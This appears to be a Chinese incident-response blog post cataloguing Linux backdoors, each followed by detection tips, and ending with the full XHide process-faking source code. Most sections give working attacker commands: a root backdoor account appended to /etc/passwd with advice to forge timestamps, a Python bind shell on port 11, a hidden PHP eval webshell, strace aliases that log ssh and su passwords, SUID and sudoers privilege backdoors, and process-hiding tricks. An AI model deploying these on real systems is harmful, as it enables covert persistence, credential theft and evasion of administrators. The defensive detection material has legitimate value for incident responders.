+++
title = 'Linux常见后门及排查技术'

description = "说实话Linux的样本一点都调不来"

tags = [ "应急响应" ]

date = 2024-11-22T17:49:53+08:00

+++

今天遇到一个清华的现场，从C2取回样本来发现是Linux挖矿的，VT检出是Xhide，由此延伸记录一下。

#### 添加Root权限后门用户

/etc/passwd这个文件包含了系统所有的用户名、ID、登录的shell等信息,这个文件是以分号分隔开的，依次是登录名、密码、用户ID、组ID，用户名、用户的根目录以及登录的shell，其中密码处可以是x(代表加密，存放在/etc/shadow文件中)，也可以直接是加密后的密文，此外用户uid为0代表用户会是root的权限，这个时候我们的目标就是在这个文件中追加一条，一个带有密文且id为0的账号。

关于密码加密我们可以使用下面的命令

```
#密码M0rk
xxx@ubuntu:~/Desktop$ perl -e 'print crypt("M0rk", "AA"). "\n"'
AAhmo1jgYI0HE
```

所以我们最终想要在passwd文件中的条目是这个样子的

```
backdoor:AAhmo1jgYI0HE:0:0:me:/root:/bin/bash
```

append the backdoor to passwd file

```
echo "backdoor:AAhmo1jgYI0HE:0:0:me:/root:/bin/bash">>/etc/passwd
```

注意当我们拥有一个命令执行漏洞或写文件漏洞且为root权限，这个时候就可以通过这种方法直接添加用户。且sshd需要允许root用户远程登录，PermitRootLogin yes

另外需要注意的是修改完文件之后记得修改一下文件的时间戳，防止被发现，可以使用touch命令进行伪造。

优点：简单，缺点：易被检测到，排查：检查/etc/passwd文件是否有异常。

#### vim后门

```
#enter the mal script directory 、execute the script and then remove the script
cd /usr/lib/python2.7/site-packages && $(nohup vim -E -c "pyfile dir.py"> /dev/null 2>&1 &) && sleep 2 && rm -f dir.py
```

此方法适用于安装了vim且安装了python扩展(绝大版本默认安装)的linux系统,至于恶意脚本dir.py的内容可以是任何功能的后门。如python版本的正向后门监听11端口。

```
#from https://www.leavesongs.com/PYTHON/python-shell-backdoor.html
from socket import *
import subprocess
import os, threading, sys, time

if __name__ == "__main__":
        server=socket(AF_INET,SOCK_STREAM)
        server.bind(('0.0.0.0',11))
        server.listen(5)
        print 'waiting for connect'
        talk, addr = server.accept()
        print 'connect from',addr
        proc = subprocess.Popen(["/bin/sh","-i"], stdin=talk,
                stdout=talk, stderr=talk, shell=True)
```

优点：通过查看/proc/`pid`/cmdline查看不到具体执行了什么命令或恶意脚本。缺点：仍可以看到有vim进程。排查：检测对应vim进程号虚拟目录的map文件是否有python字眼。

#### 障眼法之终端解析\r导致的问题

```
echo -e "<?=\`eval(\$_POST[good]\`);?>\r<?='PHP Test Page >||<                  ';?>" >/var/www/html/test.php
```

优点：通过终端命令例如cat、more等命令查看不到恶意代码,适合隐藏一句话木马等。缺点：易被检测，只是通过终端命令查看的时候看不到恶意代码，而通过其它读文件操作或者通过vim等工具进行编辑查看的时候仍可以查看到恶意代码。排查：使用编辑器或者一般的webshell扫描工具即可检测。

#### 障眼法之命令过长导致截断的问题

在使用ps进行进程查看的时候，不知道有没有人注意到这样一个问题，命令很长被截断，终端显示有时候为了美观，可能会截断较长的命令。同样在使用ps命令查看进程的时候，也存在这种问题。可以在其填充大量的空格进行截断，那么就可达到“进程隐藏”的效果。

优点：简单。缺点：易被检测到。排查：通过ps -aux|grep 可疑进程的pid 即可显示完全，或者使用ps aux | less -+S、ps aux | cat或ps aux | most -w等命令进行查看。

#### strace记录ssh登录密码

```
alias ssh='strace   -o   /tmp/sshpwd-`date    '+%d%h%m%s'`.log  \
 -e read,write,connect  -s2048 ssh'  
也可记录 su密码 alias su='strace   -o   /tmp/sshpwd-`date    '+%d%h%m%s'`.log  \
 -e read,write,connect  -s2048 su'
```

对第一行命令的解释：

```
这个 Linux 命令使用了 alias 命令来创建一个新的别名 ssh，使得每次执行 ssh 命令时，都会附加一些额外的调试和日志记录功能。具体来说，这个命令将 ssh 命令重定义为 strace 命令的一部分。以下是这个命令的详细解释：
1. alias ssh='...'
这个部分使用 alias 命令创建了一个别名 ssh。当你在命令行中输入 ssh 时，它实际上会执行等号右侧的命令。
2. strace
strace 是一个调试工具，用于跟踪系统调用和信号。它可以显示程序执行过程中调用的所有系统调用，并输出相关信息。
3. -o /tmp/sshpwd-date '+%d%h%m%s'.log
这个选项指定了 strace 的输出日志文件：
/tmp/sshpwd-... 是日志文件的路径和名称。
`date '+%d%h%m%s'` 是一个命令替换，会执行 date 命令并获取当前日期和时间。
%d：当前月份的日期（01 到 31）
%h：当前月份的缩写名称（例如：Jan, Feb）
%m：当前月份（01 到 12）
%s：自 1970-01-01 00:00:00 UTC 到当前时间的秒数（UNIX 时间戳）
这些选项组合在一起生成一个唯一的日志文件名，例如：/tmp/sshpwd-26Nov1126071747.log。
4. -e read,write,connect
这个选项指定 strace 仅跟踪特定的系统调用：
read：跟踪读取操作。
write：跟踪写入操作。
connect：跟踪网络连接操作。
5. -s2048
这个选项指定 strace 显示系统调用参数的最大字节数。在这里，设置为 2048 字节。
6. ssh
这是实际执行的 ssh 命令。重定义后的 ssh 命令将执行 strace 以监视系统调用，并将这些调用记录到指定的日志文件中。
结论
这个 alias 命令的功能是在每次执行 ssh 命令时，使用 strace 工具跟踪 ssh 命令的 read、write 和 connect 系统调用，并将这些调用记录到一个以当前日期和时间为名称的日志文件中。这对于调试和分析 ssh 命令的行为非常有用，因为它可以帮助你了解 ssh 在后台进行了哪些系统调用，以及这些调用的具体细节。
```

优点：改动较小。缺点：易被检测到。排查：通过排查shell的配置文件或者alias命令即可发现，例如~/.bashrc和~/.bash_profile文件查看是否有恶意的alias问题。(注意bash_profile是在登录的shell执行的，bashrc是在非登录的shell执行,即如果你只是想每次在登录的时候让它去执行，这个时候你可以把你的命令写在.bash_profile,如果你想每次打开一个新的终端的时候都去执行，那么应该把命令写在.bashrc中)。

#### 常见SSH后门之建立软连接

即另开一个端口进行ssh连接：

```
ln -sf /usr/sbin/sshd /home/su
/home/su -oport=2222
```

优点：简单。缺点：易被检测到。排查：使用netstat -antlp查看可疑端口，然后ls -l 可执行文件即可。

#### 常见SSH后门之修改OpenSSH源码

通过在openssh源码中插入恶意代码重新编译并替换原有sshd文件。插入的恶意代码可以是将登录成功的用户密码发送到远程服务器或者记录到某个log文件中。

优点：隐蔽性较好。排查：这种sshd后门一般可能会有一定的特征，可以通过strings sshd |grep '[1-9]{1,3}.[1-9]{1,3}.'或者通过strace 查看是否有可疑的写文件操作。

#### 常见SSH后门之创建authorized_keys 实现免密码登录的后门

在本地生成公私钥对，然后将公钥写入服务器的authorized_keys文件中，客户端使用私钥进行登录。

排查：查看linux所有用户.ssh 目录下是否存在authroieze_keys文件以及文件中的内容。

#### 定时任务和开机启动项

一般的挖矿木马喜欢设置定时任务来进行驻留或进行分时段的挖矿。

排查：一般通过crontab -l命令即可检测到定时任务后门。不同的linux发行版可能查看开机启动项的文件不大相同，Debian系linux系统一般是通过查看/etc/init.d目录有无最近修改和异常的开机启动项。而Redhat系的linux系统一般是查看/etc/rc.d/init.d或者/etc/systemd/system等目录。

#### 预加载型动态链接库后门 ld.so.preload

在linux下执行某个可执行文件之前，系统会预先加载用户定义的动态链接库的一种技术，这个技术可以重写系统的库函数，导致发生Hijack。strace 命令id的时候可以发现有预先去读取/etc/ld.so.preload文件(也可使用设置LD_PRELAOD环境变量方式)，如果我们将事先写好的恶意so文件位置写入ld.so.preload文件，这个时候就会达到“劫持”的效果。

还有一种是通过修改动态链接器来加载恶意动态链接库的后门，通过替换或者修改动态链接器中的默认预加载配置文件/etc/ld.so.preload路径的rootkit，此方法更加隐蔽。

排查：通过strace命令去跟踪预加载的文件是否为/etc/ld.so.preload，以及文件中是否有异常的动态链接库。以及检查是否设置LD_PRELOAD环境变量等。注意：在进行应急响应的时候有可能系统命令被替换或者关键系统函数被劫持（例如通过预加载型动态链接库后门），导致系统命令执行不正常，这个时候可以下载busybox。下载编译好的对应平台版本的busybox，或者下载源码进行编译通过U盘拷贝到系统上，因为busybox是静态编译的，不依赖于系统的动态链接库，busybox的使用类似如下 busybox ls，busybox ps -a。

#### 提权后门

suid提权后门，有时候需要放置一个提权后门方便我们拿到一个低权限shell的时候提权，例如 cp /bin/bash /bin/nf & chmod +s /bin/nf ,之后通过低权限账号登录的时候就可以执行/bin/nf 来以root用户执行命令。

sudo 后门，同样是提权后门，在/etc/sudoers 文件中添加如下的内容 jenkins ALL=(ALL) NOPASSWD: ALL，使jenkins用户可以使用sudo执行任意命令。

排查：suid后门可通过 find / -perm -4000 来查找suid程序，sudo后门可以检查 /etc/sudoers。

#### 进程注入

使用ptrace向进程中注入恶意so文件工具linux-inject

#### 内核级rootkit

内核级的rootkit也很多，这里简单推荐一个Diamorphine

#### 基于用户空间的进程隐藏手法之偷梁换柱型

通过替换系统中常见的进程查看工具（比如ps、top、lsof）的二进制程序，导致原先查看进程相关信息的工具（ps、top、lsof等）都被调包。

#### 基于用户空间的进程隐藏手法之HooK系统调用型

没看懂/(ㄒoㄒ)/~~

#### 基于用户空间的进程隐藏手法之伪造进程名型

在恶意代码中通过设置具有迷惑性的进程名字，以达到躲避管理员检查的目的。

#### 基于用户空间的进程隐藏手法之挂载覆盖型

利用mount —bind 将另外一个目录挂载覆盖至/proc/目录下指定进程ID的目录，我们知道ps、top等工具会读取/proc目录下获取进程信息，如果将进程ID的目录信息覆盖，则原来的进程信息将从ps的输出结果中隐匿。

比如进程id为42的进程信息：mount -o bind /empty/dir /proc/42

#### 最后贴一下Github上的xhide源代码：

```
#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <string.h>
#include <fcntl.h>
#include <pwd.h>
#include <grp.h>

void usage(char *progname);

int changeown (char *str)
{
	char user[256], *group;
	struct passwd *pwd;
	struct group *grp;

	uid_t uid;
	gid_t gid;

	memset(user, '\0', sizeof(user));
	strncpy(user, str, sizeof(user));

	for (group = user; *group; group++)
		if (*group == ':')
		{
			*group = '\0';
			group++;
			break;
		}

	if (pwd = getpwnam(user)) 
	{

		uid = pwd->pw_uid;
		gid = pwd->pw_gid;
	} else uid = (uid_t) atoi(user);

	if (*group)
		if (grp = getgrnam(group)) gid = grp->gr_gid;
		else gid = (gid_t) atoi(group);

	if (setgid(gid)) {
		perror("Error: Can't set GID");
		return 0;
	}

	if (setuid(uid))
	{
		perror("Error: Can't set UID");
		return 0;
	}

	return 1;
}

char *fullpath(char *cmd)
{
	char *p, *q, *filename;
	struct stat st;

	if (*cmd == '/')
		return cmd;

	filename = (char *) malloc(256);

	if  (*cmd == '.')
		if (getcwd(filename, 255) != NULL)
		{
			strcat(filename, "/");
			strcat(filename, cmd);
			return filename;
		}
		else
			return NULL;

	for (p = q = (char *) getenv("PATH"); q != NULL; p = ++q)
	{
		if (q = (char *) strchr(q, ':'))
			*q = (char) '\0';

		snprintf(filename, 256, "%s/%s", p, cmd);

		if (stat(filename, &st) != -1
				&& S_ISREG(st.st_mode)
				&& (st.st_mode&S_IXUSR || st.st_mode&S_IXGRP || st.st_mode&S_IXOTH))
			return filename;

		if (q == NULL)
			break;
	}

	free(filename);

	return NULL;

}

void usage(char *progname)
{
	fprintf(stderr, "XHide - Process Faker, by Schizoprenic "
			"Xnuxer Research (c) 2002\n\nOptions:\n"

			"-s string\tFake name process\n"
			"-d\t\tRun aplication as daemon/system (optional)\n" 
			"-u uid[:gid]\tChange UID/GID, use another user (optional)\n" 
			"-p filename\tSave PID to filename (optional)\n\n"

			"Example: %s -s \"klogd -m 0\" -d -p test.pid ./egg bot.conf\n\n",progname);

	exit(1);
}

int main(int argc,char **argv)
{
	char c;
	char fake[256];
	char *progname, *fakename;
	char *pidfile, *fp;
	char *execst;

	FILE *f;

	int runsys=0, null;
	int j,i,n,pidnum;
	char **newargv;

	progname = argv[0];
	if(argc<2) usage(progname);

	for (i = 1; i < argc; i++)
	{
		if (argv[i][0] == '-')
			switch (c = argv[i][1])
			{

				case 's': fakename = argv[++i]; break;
				case 'u': changeown(argv[++i]); break; 
				case 'p': pidfile = argv[++i]; break;
				case 'd': runsys = 1; break;

				default:  usage(progname); break;
			}
		else break;
	}

	if (!(n = argc - i) || fakename == NULL) usage(progname);

	newargv = (char **) malloc(n * sizeof(char **) + 1);
	for (j = 0; j < n; i++,j++) newargv[j] = argv[i];
	newargv[j] = NULL;

	if ((fp = fullpath(newargv[0])) == NULL) { perror("Full path seek"); exit(1); }
	execst = fp;

	if (n > 1)
	{
		memset(fake, ' ', sizeof(fake) - 1);
		fake[sizeof(fake) - 1] = '\0';
		strncpy(fake, fakename, strlen(fakename));
		// Kent, this is the key point.. keke
		newargv[0] = fake;
		/*for (int i = 1; i < n; i++) newargv[i] = "";*/
	}
	else newargv[0] = fakename;

	if (runsys) 
	{
		if ((null = open("/dev/null", O_RDWR)) == -1)
		{
			perror("Error: /dev/null");
			return -1;
		}

		switch (fork())
		{
			case -1:
				perror("Error: FORK-1");
				return -1;

			case  0:
				setsid();
				switch (fork())
				{

					case -1:
						perror("Error: FORK-2");
						return -1;

					case  0:
						umask(0);
						close(0);
						close(1);
						close(2);
						dup2(null, 0);
						dup2(null, 1);
						dup2(null, 2);

						break;

					default:
						return 0;
				}
				break;
			default:
				return 0;
		}
	}

	waitpid(-1, (int *)0, 0);        
	pidnum = getpid();

	if (pidfile != NULL && (f = fopen(pidfile, "w")) != NULL)
	{
		fprintf(f, "%d\n", pidnum);
		fclose(f);
	}

	fprintf(stderr,"==> Fakename: %s PidNum: %d\n",fakename,pidnum); 
	execv(execst, newargv);
	perror("Couldn't execute");
	return -1;
}
```

参考：

[linux常见backdoor及排查技术](https://xz.aliyun.com/t/4090?time__1311=n4%2Bxni0QG%3DoCq2x0x05DK8QxmOwjztKKO4D&u_atoken=f659ca72a567e6ac2091b3810cb6b4a0&u_asig=ac11000117324992524736399e014b)

[聊一聊Linux下进程隐藏的常见手法及侦测手段](https://www.anquanke.com/post/id/160843#h2-1)
